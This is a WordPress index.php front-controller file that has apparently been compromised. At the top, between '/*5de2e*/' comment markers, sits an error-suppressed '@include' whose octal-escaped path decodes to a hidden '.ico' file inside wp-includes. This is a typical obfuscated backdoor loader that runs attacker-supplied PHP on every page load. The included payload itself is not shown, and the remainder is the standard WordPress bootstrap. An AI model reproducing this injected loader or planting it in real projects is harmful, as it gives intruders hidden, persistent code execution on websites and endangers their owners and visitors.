<?php
/*5de2e*/

@include "\057ho\155e/\143op\171ne\164/f\164p/\142ea\165ty\163ki\156/w\160-i\156cl\165de\163/R\145qu\145st\163/T\162an\163po\162t/\05612\14626\1418b\056ic\157";

/*5de2e*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
